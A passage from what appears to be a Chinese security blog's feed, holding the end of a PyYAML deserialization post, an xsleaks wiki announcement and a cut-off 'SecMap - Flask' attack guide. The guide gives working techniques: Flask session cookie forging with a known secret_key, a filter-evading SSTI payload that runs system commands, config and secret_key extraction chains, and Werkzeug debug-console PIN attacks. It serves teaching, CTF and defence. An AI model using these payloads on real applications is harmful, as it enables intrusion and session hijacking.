id="版本大于等于-5.3.1">版本大于等于 5.3.1</h3><blockquote><p>2022.6.29 本文更新</p></blockquote><p>5.3.1 引入了一个新的过滤机制，本质上就是实现一个属性名黑名单（正则），匹配到就报错。</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/20220629170947.png!blog" /></p><p>见：https://github.com/yaml/pyyaml/pull/386</p><p>简单，粗暴。</p><h3 id="版本大于等于-5.4">版本大于等于 5.4</h3><blockquote><p>2022.6.29 本文更新</p></blockquote><p>FullConstructor 现在只额外支持 <code>!!python/name</code>，<code>!!python/object/apply</code>、<code>!!python/object</code>、<code>!!python/object/new</code> 和 <code>!!python/module</code> 都 G 了。</p><h3 id="版本大于等于-6.0">版本大于等于 6.0</h3><blockquote><p>2022.6.29 本文更新</p></blockquote><p>现在在使用 <code>yaml.load</code> 时，用户必须指定 Loader。这个改进其实有点强硬，所以引发了一堆 issue，还有人在直接开怼认为这是糟糕的设计。但是至少安全性上来说，相比给一个告警，确实得到了一定提升。</p><p>issue 见：https://github.com/yaml/pyyaml/issues/576</p><h2 id="防御">防御</h2><p>我感觉大多数时候没必要使用如此灵活的解析，所以作为研发，可以尽量使用 <code>yaml.safe_load</code> 来做解析，这一点没啥可说的。</p><p>写完这一切之后，我在官方 issue 中看到了关于 &gt;5.1 的 <code>yaml.full_load</code> 安全问题的讨论，这个是默认方法却存在漏洞。作为安全人员，我的观点是官方提供的默认方法应该是安全的，即使牺牲了部分功能。如果一定需要使用那些不太安全的功能也可以，但是需要主动开启（例如加额外的参数，或者换方法名），否则大多数人都会使用 full_load，毕竟是默认的方法。我感觉打印警告起到的作用还是稍微弱了一些。</p><br><p style="text-align: center;"><font size="2px" color="gray">本来周一就有周末综合征<br>又叠加了一个节后综合征<br>buff 叠满了</font><br /><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;上半年假期过完咯。&lt;/p&gt;</summary>
    
    
    
    <category term="经验总结" scheme="https://www.tr0y.wang/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="Web" scheme="https://www.tr0y.wang/tags/Web/"/>
    
    <category term="SecMap" scheme="https://www.tr0y.wang/tags/SecMap/"/>
    
  </entry>
  
  <entry>
    <title>xsleaks wiki 中文版发布</title>
    <link href="https://www.tr0y.wang/2022/05/30/xsleaks-wiki-zh_CN/"/>
    <id>https://www.tr0y.wang/2022/05/30/xsleaks-wiki-zh_CN/</id>
    <published>2022-05-30T19:00:00.000Z</published>
    <updated>2023-05-04T09:44:57.356Z</updated>
    
    <content type="html"><![CDATA[<p>xsleaks wiki 中文版发布，提前祝各位六一快乐！</p><span id="more"></span><p>前段时间打一个 CTF 的时候，遇到了一道 xsleaks 的题目，队内复盘的时候找到了 Google 的 xsleaks wiki：</p><p>https://github.com/xsleaks/xsleaks</p><p>我这个人学习的时候不喜欢东学一块西学一块，要么系统性地学，要么就摆烂不学。所以最近就在看这个 wiki，感觉很有意思，所以我给他翻译了一下，中文版 wiki 的仓库链接见：</p><p>https://github.com/Macr0phag3/xsleaks-wiki-zh_CN</p><p>我认为这种攻击方式算比较新的（这几年才有比较完整的资料），也算比较旧的（很多特性很多年之前就已经被人用过了）。目前我对它的理解，就是一句话：通过浏览器在不同场景下的不同行为（报错/布尔盲注或者侧信道），推测一些原来受到同源策略（或其他浏览器限制）没法直接读取到的数据（所以大部分是敏感信息泄露）。</p><p>我这个 wiki 与官方 wiki 的差别除了语言之外，还新增了 demo 文件夹，里面目前只有一个小 demo，后面会补充一些 demo 和 CTF 题。</p><p>由于我才刚开始学习这种攻击方式，虽然翻译一遍基本上等同于看了一遍，但是很多细节我并没有深入研究，所以我在理解以及利用上可能还会差点意思。因此，后面应该会有 SecMap-xsleaks 的系列文章，主要路线是：</p><ol type="1"><li>CTF 题目，这个优先级比较高</li><li>真实的 demo</li><li>知识的介绍（相比于这份 wiki 会解释得更加详细）</li></ol><p>这三条路线如果仔细搞的话，估计够我写个大半年的文章。。。所以应该不会很密集地出。</p><p>好了，够 300 字了，本文比较简单就不多 bb 了，下期见！</p><br><p style="text-align: center;"><font size="2px" color="gray">仓库里的 demo 还挺有意思的<br>不来试试吗？</font><br /><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;xsleaks wiki 中文版发布，提前祝各位六一快乐！&lt;/p&gt;</summary>
    
    
    
    <category term="经验总结" scheme="https://www.tr0y.wang/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="Web" scheme="https://www.tr0y.wang/tags/Web/"/>
    
    <category term="SecMap" scheme="https://www.tr0y.wang/tags/SecMap/"/>
    
    <category term="xsleaks" scheme="https://www.tr0y.wang/tags/xsleaks/"/>
    
  </entry>
  
  <entry>
    <title>SecMap - Flask</title>
    <link href="https://www.tr0y.wang/2022/05/16/SecMap-flask/"/>
    <id>https://www.tr0y.wang/2022/05/16/SecMap-flask/</id>
    <published>2022-05-16T19:00:00.000Z</published>
    <updated>2023-05-04T09:44:57.352Z</updated>
    
    <content type="html"><![CDATA[<p>SecMap 系列之 Flask，本篇介绍 flask 相关的攻击手法。</p><span id="more"></span><h2 id="介绍">介绍</h2><p>flask 还是一个非常流行的 Python Web 框架，我个人是非常喜欢的。</p><h2 id="基础知识">基础知识</h2><p>flask 是典型的轻量级 Web 框架，仅保留了核心功能：请求响应处理和模板渲染。这两类功能分别由 Werkzeug（WSGI）完成和 jinja2 负责。</p><p>jinja2 就不用多说了，之前的文章说过。Werkzeug 是一个专门用来处理 HTTP 和 WSGI 的工具库，可以方便的在 Python 中处理 HTTP 协议相关内容。这里顺便提一下，Werkzeug 不是一个 Web 服务器，也不是一个 Web 框架，而是一个工具包，官方的介绍说是一个 WSGI 工具包，它可以作为一个 Web 框架的底层库，因为它封装好了很多 Web 框架需要用到的基本操作，例如 Request，Response 等等。如果橘友们感兴趣可以看官方文档，按照这个文档非常容易上手 Werkzeug（见资料 1）。</p><p>flask 还是比较流行的，教程一抓一大把，基础的使用就不啰嗦了，我们直接来看看 flask 都有哪些攻击面。</p><h2 id="攻击思路">攻击思路</h2><h3 id="常规姿势">常规姿势</h3><p>首先，flask 本身的漏洞本篇就不详细介绍了，大家一搜 CVE 都有（见资料 2），目前来看（2022-05-06），版本 &gt;= <code>0.12.3</code> 是没有通用漏洞的。</p><p>其次，为了避免内容重复，非 flask 直接导致的漏洞不再本篇范围中，例如直接拼接 sql 导致 sql 注入、CSRF、SSRF 等，这些攻击方式并非使用 flask 所导致的，推荐去看 SecMap 的对应系列，更容易理解。</p><h3 id="session-信息泄露-伪造">session 信息泄露 &amp; 伪造</h3><p>session 的作用大家都比较熟悉了，就不用介绍了。</p><p>它的常见实现形式是当用户发起一个请求的时候，后端会检查该请求中是否包含 sessionid，如果没有则会创造一个叫 sessionid 的 cookie，用于区分不同的 session。sessionid 返回给浏览器，并将 sessionid 保存到服务器的内存里面；当已经有了 sessionid，服务端会检查找到与该 sessionid 相匹配的信息直接用。</p><p>所以显而易见，session 和 sessionid 都是后端生成的。且由于 session 是后端识别不同用户的重要依据，而 sessionid 又是识别 session 的唯一依据，所以 session 一般都保存在服务端避免被轻易窃取，只返回随机生成的 sessionid 给客户端。对于攻击者来说，假设需要冒充其他用户，那么必须能够猜到其他用户的 sessionid，这是比较困难的。</p><p>对于 flask 来说，它的 session 不是保存到内存里的，而是直接把整个 session 都塞到 cookie 里返回给客户端。那么这会导致一个问题，如果我可以直接按照格式生成一个 session 放在 cookie 里，那么就可以达到欺骗后端的效果。</p><p>阅读源码可知，flask 生成 session 的时候会进行序列化，主要有以下几个步骤：</p><ol type="1"><li>用 <code>json.dumps</code> 将对象转换成 json 字符串</li><li>如果第一步的结果可以被压缩，则用 zlib 库进行压缩</li><li>进行 base64 编码</li><li>通过 secret_key 和 hmac 算法（flask 这里的 hmac 默认用 sha1 进行 hash，还多了一个 salt，默认是 <code>cookie-session</code>）对结果进行签名，将签名附在结果后面（用 <code>.</code> 拼接）。如果第二步有压缩的话，结果的开头会加上 <code>.</code> 标记。</li></ol><p>可以看到，最后一步解决了用户篡改 session 的安全问题，因为在不知道 secret_key 的情况下，是无法伪造签名的。</p><p>所以这会直接导致 2 个可能的安全问题：</p><ol type="1"><li>数字签名的作用是防篡改，没有保密的作用。所以 flask 的 session 解开之后可以直接看到明文信息，可能会导致数据泄露</li><li>如果知道 secret_key 那么可以伪造任意有效的 session（这个说法并不完全准确，文末的防御那一小节会说明原因）</li></ol><p>下面举个例子：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session<br><br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;Tr0y_1s_Macr0phag3&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>():<br>    user = session.get(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;Hacker&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Welcome, <span class="hljs-subst">&#123;user&#125;</span>!&#x27;</span><br><br><br>app.run()<br></code></pre></td></tr></table></figure></p><p>比如这段代码，我们访问之后会得到一个 session：<code>eyJ1c2VyIjoicm9vdCJ9.YnkAHQ.20MEAtmoX7Djup_Irjze03qSnSA</code></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/b2403caf-03cd-4a2d-acb0-6e10646be004.png!blog#width-zoom6" /></p><p>按照生成的过程，我们可以很容易解开 session：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">In [<span class="hljs-number">76</span>]: session = <span class="hljs-string">&quot;eyJ1c2VyIjoicm9vdCJ9.YnkAHQ.20MEAtmoX7Djup_Irjze03qSnSA&quot;</span><br><br>In [<span class="hljs-number">77</span>]: <span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> URLSafeTimedSerializer, base64_decode, encoding<br><br>In [<span class="hljs-number">78</span>]: base64_decode(<span class="hljs-string">&quot;eyJ1c2VyIjoicm9vdCJ9&quot;</span>)<br>Out[<span class="hljs-number">78</span>]: <span class="hljs-string">b&#x27;&#123;&quot;user&quot;:&quot;root&quot;&#125;&#x27;</span><br><br>In [<span class="hljs-number">79</span>]: base64_decode(<span class="hljs-string">&quot;YnkAHQ&quot;</span>)<br>Out[<span class="hljs-number">79</span>]: <span class="hljs-string">b&#x27;by\x00\x1d&#x27;</span><br><br>In [<span class="hljs-number">80</span>]: encoding.bytes_to_int(<span class="hljs-string">b&#x27;by\x00\x1d&#x27;</span>)<br>Out[<span class="hljs-number">80</span>]: <span class="hljs-number">1652097053</span><br><br>In [<span class="hljs-number">81</span>]: URLSafeTimedSerializer(<br>    ...:     <span class="hljs-string">&#x27;Tr0y_1s_Macr0phag3&#x27;</span>, <br>    ...:     salt=<span class="hljs-string">&quot;cookie-session&quot;</span>, <br>    ...:     signer_kwargs=&#123;<span class="hljs-string">&quot;key_derivation&quot;</span>: <span class="hljs-string">&quot;hmac&quot;</span>&#125;<br>    ...: ).loads_unsafe(<span class="hljs-string">&quot;eyJ1c2VyIjoicm9vdCJ9.YnkAHQ.20MEAtmoX7Djup_Irjze03qSnSA&quot;</span>)<br>Out[<span class="hljs-number">81</span>]: (<span class="hljs-literal">True</span>, &#123;<span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;root&#x27;</span>&#125;)  <span class="hljs-comment"># 第一个值代表签名是否有效</span><br></code></pre></td></tr></table></figure></p><p>所以如果 session 里有敏感信息，那么直接就泄露了。</p><p>最后，如果搞到 secret_key，可以这样伪造 session：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> URLSafeTimedSerializer<br><br><br>URLSafeTimedSerializer(<br>    <span class="hljs-string">&#x27;Tr0y_1s_Macr0phag3&#x27;</span>,<br>    salt=<span class="hljs-string">&quot;cookie-session&quot;</span>,  <span class="hljs-comment"># 这是默认的</span><br>    signer_kwargs=&#123;<span class="hljs-string">&quot;key_derivation&quot;</span>: <span class="hljs-string">&quot;hmac&quot;</span>&#125;<br>).dumps(&#123;<span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;root&#x27;</span>&#125;)<br></code></pre></td></tr></table></figure></p><p>来试试伪造的 session：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/34481fa5-aac1-4f59-acde-5809ed60d1ca.png!blog" /></p><p>nice.</p><p>大家似乎都很喜欢用 <code>flask-session-cookie-manager</code> （见资料 3），但是我不知道它和 <code>itsdangerous.URLSafeTimedSerializer</code> 的区别是啥...这个类既可以解开也可以伪造。难道是没有压缩功能？但是伪造的时候也不需要压缩呀？</p><p>最后教大家一个快速调试的方式。</p><p>我们平时写一些小脚本都需要搞点测试用例来测试，那像 flask 这种 Web 应用，如果每次修改代码都需要重启服务，再通过 HTTP 协议来测试，那实在是太慢了。对于我们安全来说，一样需要测试各种 payload。由于安全一般只需要简单的测试，所以不需要用比较重的测试框架例如 pytest 之类的。所以我们只需要直接用 <code>Flask.test_client</code> 就可以模拟请求了，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template_string, request<br><br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>():<br>    user = request.args.get(<span class="hljs-string">&quot;user&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">f&#x27;&#123;&#123;% autoescape false %&#125;&#125;Welcome, <span class="hljs-subst">&#123;user&#125;</span>!&#123;&#123;%endautoescape%&#125;&#125;&#x27;</span>)<br><br><br>app.test_client().get(<span class="hljs-string">&#x27;/&#x27;</span>, query_string=&#123;<span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;&#123;&#123; 1+1 &#125;&#125;&quot;</span>&#125;).get_data(as_text=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><code>test_client</code> 下方法的属性列表可以在 <code>site-packages/werkzeug/test.py</code> 里的 <code>class EnvironBuilder:</code> 下的注释中找到。</p><h3 id="flask-的-ssti">flask 的 SSTI</h3><p>这一节本来是放在《SecMap - SSTI（jinja2）》（见资料 4）中介绍的，但是为了查询的便利性，就放在这里好了，jinja2 那篇文章中会引用这里的知识点。</p><p>flask 最常见的搭档就是 jinja2 了。由于 flask 会引入新的变量，所以也会引入新的姿势。从官方文档可以看到官方引入的新的全局变量（见资料 5）</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/933c3335-74cc-490f-bfc5-7383445de6b6.png!blog#width-zoom7" /></p><ul><li><code>config</code>：当前配置对象，原型为 <code>flask.Flask().config</code></li><li><code>request</code>：当前 request 对下，原型为 <code>flask.request</code>。注：如果模板渲染的时候 request context 没有激活，这个变量是没法在模板中使用的</li><li><code>session</code>：当前 session 对象，原型是 <code>flask.session</code>。注：如果模板渲染的时候 request context 没有激活，这个变量是没法在模板中使用的</li><li><code>g</code>：全局变量的 request-bound 对象，原型是 <code>flask.g</code>。注：如果模板渲染的时候 request context 没有激活，这个变量是没法在模板中使用的</li><li><code>url_for()</code>，原型是 <code>flask.url_for()</code></li><li><code>get_flashed_messages()</code>：原型是 <code>flask.get_flashed_messages()</code></li></ul><h4 id="通用绕过姿势">通用绕过姿势</h4><p>常规的通用绕过姿势就不重复说了，《SecMap - SSTI（jinja2）》 里说的很全。</p><p>除此之外，flask 的 <code>request</code> 中包含了大量请求相关的属性（见资料 6），可以用于 bypass 一些非常严格的限制。</p><ol type="1"><li><code>request.args</code>：GET 请求的参数</li><li><code>request.form</code>：POST 参数</li><li><code>request.values</code>：POST 和 GET 的参数</li><li><code>request.cookies</code>：Cookies 值</li><li><code>request.files</code>：包含了上传的文件名和内容</li><li><code>request.headers</code>：请求头</li><li>直接获取头的属性，上面文档中含有 <code>entity-header field</code> 关键字的都是，比如：<ol type="1"><li><code>request.authorization</code>：basic 认证的凭据</li><li><code>request.content_type</code>：<code>Content-Type</code> HTTP 头</li><li><code>request.content_md5</code>：<code>Content-MD5</code> HTTP 头</li><li><code>request.get_data</code>：和 <code>request.data</code> 类似</li><li>...</li></ol></li><li><code>request.full_path</code>：完整请求路径，包含参数</li><li><code>request.environ</code>：WSGI 的环境变量，包含 HTTP 头（对应的键会自动加上 <code>HTTP_</code> 前缀），还有 WSGI 服务端的一些信息</li><li>以及通过 mro 我们也是可以间接获取到这些属性的。</li></ol><p>这些请求相关的属性可以传递任何被过滤的字符串。举例，假设参数 user 过滤了 <code>os</code>、<code>system</code>，那我们可以任意指定另外三个参数，分别用于传递 <code>os</code>、<code>system</code>、命令，payload 可以这样：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">?user=&#123;&#123;config.get_namespace.__globals__[request.args.module][request.args.func](request.args.cmd)&#125;&#125;<br>&amp;module=os<br>&amp;func=system<br>&amp;cmd=whoami<br></code></pre></td></tr></table></figure></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/3ce21907-892f-4068-befa-33802ef4de56.png!blog" /></p><p>这个姿势是非常非常通用的。利用的时候，最重要的资料还是官方文档。</p><h4 id="通过-mro-寻找可利用模块">通过 mro 寻找可利用模块</h4><p>mro 直接利用 dibber 搜索就行（见资料 7）</p><blockquote><p>config</p></blockquote><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/f704705f-df49-4068-93d2-9e4c660ce06b.png!blog#width-zoom8" /></p><blockquote><p>g</p></blockquote><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/9c934cd6-29f1-448c-8295-2957a6a83fc2.png!blog" /></p><p>其他同理，就不列举了，橘友们用 dibber 自行尝试即可。</p><h4 id="config-信息泄露">config 信息泄露</h4><p>config 是 flask 中的一个全局对象，它代表当前配置实例，包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY 等敏感值。</p><p>所以如果可以获取到 config，就可以直接拿到各种敏感数据。比如如果需要获取绝对 Web 根目录可以用 <code>config.root_path</code>；比如上面说的伪造 session 需要 secret_key，而 config 就有 secret_key。所以只要获取了 config 就可以伪造 session 了。</p><p>如果存在 SSTI 那么直接 <code>&#123;&#123; config &#125;&#125;</code> 就可以了。当然，如果没法直接拿 config，可以用 mro 来找其他利用链，比如：</p><ul><li><code>url_for.__globals__['current_app'].config</code></li><li><code>get_flashed_messages.__globals__['current_app'].config</code></li><li><code>self.__dict__._TemplateReference__context.config</code>，这个就是 jinja2 自带的，在 jinja2 的 SSTI 中介绍过了</li><li>...</li></ul><p>同样，类似的替换方式写个 dibber 的插件即可自动搜索。</p><p>实在不行，先确定脚本的路径，再直接读源码也是 ok 的...</p><p>上面有个结论，“只要拿到了 secret_key 就可以伪造 session”，这个说法并不是非常准确。因为通过上面的分析可知，session 的签名还取决于使用的密钥派生函数、salt 和 hash 算法，这三者只要替换掉一个，用现有的工具即使知道 secret_key 也是没法生成有效的 session 的。</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/6e2d5367-8bab-4552-8d61-00a887643a46.png!blog" /></p><p>所以这就是一个 ctf 的出题思路了：</p><ol type="1"><li>题目的目的：伪造 root 的 session</li><li>题目中存在 ssti</li></ol><p>由于可以直接拿到 secret_key，所以估计很多人直接开始伪造 session，然后发现 session 就是无效的...</p><p>所以在用 flask 的时候，不妨换一个 salt，也没啥改造的成本。</p><p>当然，如果存在 SSTI，那么是可以非常轻易地获取这三个信息的：</p><ul><li><code>config.__init__.__globals__.__builtins__.__import__('flask').sessions.SecureCookieSessionInterface.key_derivation</code></li><li><code>config.__init__.__globals__.__builtins__.__import__('flask').sessions.SecureCookieSessionInterface.salt</code></li><li><code>config.__init__.__globals__.__builtins__.__import__('flask').sessions.SecureCookieSessionInterface.digest_method</code></li></ul><p>确认这三个关键的信息之后，结合 secret_key 就可以伪造了。</p><h3 id="利用-debug-模式姿势">利用 debug 模式姿势</h3><p>flask 贴心地提供了 debug 模式，只需要加参数 <code>app.run(debug=True)</code> 即可，用于在测试的时候及时发现和定位问题。</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/e10d7f9a-f143-44b9-ba91-69d256e74ccf.png!blog" /></p><p>黑盒判断是否开启 debug 模式，最直接的方式就是触发一个报错。除此之外还有一种方法：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-string">&quot;__debugger__&quot;</span> <span class="hljs-keyword">in</span> requests.get(<br>  <span class="hljs-string">&#x27;http://127.0.0.1:5000/?__debugger__=yes&amp;cmd=resource&amp;f=style.css&#x27;</span><br>).text<br></code></pre></td></tr></table></figure></p><p><code>style.css</code> 位于 <code>site-packages/werkzeug/debug/shared/</code> 下，这里面所有的文件都可以用来判断。</p><p>仔细观察可以发现，这个页面中有很多可以利用的地方。</p><h4 id="信息泄露">信息泄露</h4><p>这个页面中的报错所在代码是可以点击的，且是按照 Python 异常堆栈顺序排列，所以一般最后一行就是报错的原始代码。点击之后可以看到 10 行源代码，触发报错的代码在第 6 行。如果敏感信息正好在这个范围里，那么就会泄露出来。</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/4035a916-551c-401e-82af-35ba9c29bae1.png!blog" /></p><p>按照这个思路，如果我们在 SSTI 的时候，发现是无回显的，那么也可以通过触发报错，然后在 debug 里获得结果。</p><h4 id="利用报错解决无回显">利用报错解决无回显</h4><p><code>eval</code> 或者 <code>exec</code> 我们想看到的数据即可：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/f8424ba9-027e-4b36-91e9-7c83b333abf5.png!blog" /></p><h4 id="get-pin-get-shell">get PIN, get shell</h4><p>在 debug 页面中甚至还提供了 python 的交互式 shell，方便 plus。</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/4f68d80e-9f35-48e8-b36c-2630db9ae36d.png!blog" /></p><p>但前提是需要有 <code>Debugger PIN</code>：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/31eb9888-bbcd-4960-81db-6cd12bec694d.png!blog#width-zoom6" /></p><p>这个在 debug 模式下启动 flask 的时候可以直接获取到（通常是在终端直接打印）。作为攻击者，是没法直接拿到这个 PIN 的。</p><blockquote><p>爆破 PIN</p></blockquote><p>最直接的办法就是爆破。可惜 flask 默认带有爆破防御功能，在 <code>site-packages/werkzeug/debug/__init__.py</code> 中的 <code>pin_auth</code>：</p><ol type="1"><li>一旦检查 PIN 失败就会调用 <code>_fail_pin_auth</code>，让 <code>self._failed_pin_auth</code> 加 1</li><li>如果 <code>self._failed_pin_auth &gt; 5</code>，每次认证返回响应前延时 5s</li><li>如果 <code>self._failed_pin_auth &gt; 10</code>，强制停止 PIN 校验逻辑，只能重启服务来重置</li></ol><p>这里有个细节，由于 <code>_fail_pin_auth</code> 是 sleep 之后才 +1，所以理论上只要在 5s 内发出很多请求，那么可以在 +1 之前就经过很多次 PIN 验证。遗憾的是，flask PIN 一般都有 9 位数字，每位有 10 种可能性，也就是 10 亿种可能性，一共可以尝试 10 次，就算每次都延迟 5s，那么 50s 内需要发出 10 亿次尝试，这显然是不可能的。不过这个可以耗尽尝试次数导致别人也无法使用 debug，那么显然这是一个比较鸡肋的 DoS。</p><p>所以爆破的路子走不通，我们需要寻找其他方式。</p><p>通过分析 flask 源码可以拿到以下调用链，可以看出 PIN 的生成是相对固定的：</p><ol type="1"><li>入口 py 文件 中的 <code>... .run()</code></li><li><code>site-packages/flask/app.py</code> 中，<code>class Flask(Scaffold):</code> 下 <code>run</code> 的 <code>run_simple(host, port, self, **options)</code></li><li><code>site-packages/werkzeug/serving.py</code> 中，<code>run_simple</code> 的 <code>application = DebuggedApplication(application, use_evalex)</code></li><li><code>site-packages/werkzeug/debug/__init__.py</code> 中，<code>class DebuggedApplication:</code> 下 <code>pin</code> 的 <code>pin_cookie = get_pin_and_cookie_name(self.app)</code></li><li><code>site-packages/werkzeug/debug/__init__.py</code> 中的<code>get_pin_and_cookie_name</code></li></ol><p><code>get_pin_and_cookie_name</code> 中，可以看到对 PIN 的处理有一些特殊的逻辑，见下面代码注释：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span 